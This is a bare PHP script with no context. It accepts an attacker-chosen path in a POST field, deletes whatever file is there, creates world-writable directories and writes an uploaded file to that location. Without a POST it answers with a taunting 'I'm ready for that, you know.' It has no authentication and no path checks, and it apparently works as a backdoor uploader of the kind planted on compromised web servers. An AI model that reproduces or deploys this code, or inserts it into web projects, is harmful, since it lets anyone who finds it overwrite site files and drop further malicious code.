<?php

@error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

function mkdirs($path, $mod = 0777) {
    if (is_dir($path)) {
        return chmod($path, $mod);
    } else {
        $old = umask(0);
        if(mkdir($path, $mod, true) && is_dir($path)){
            umask($old);
            return true;
        } else {
            umask($old);
        }
    }
    return false;
}

if($_POST['to']){
    $to = urldecode($_POST['to']);
    if(is_dir($to) || $_FILES["file"]["error"] > 0){
        header("Status: 500 Internal Server Error");
    } else {
        if(file_exists($to)){
            unlink($to);
        } else {
            $dir = dirname($to);
            if(!file_exists($dir)){
                mkdirs($dir);
            }
        }
        echo move_uploaded_file($_FILES["file"]["tmp_name"], $to) ? 0 : 1;
    }
} else {
    echo 'I\'m ready for that, you know.';
}
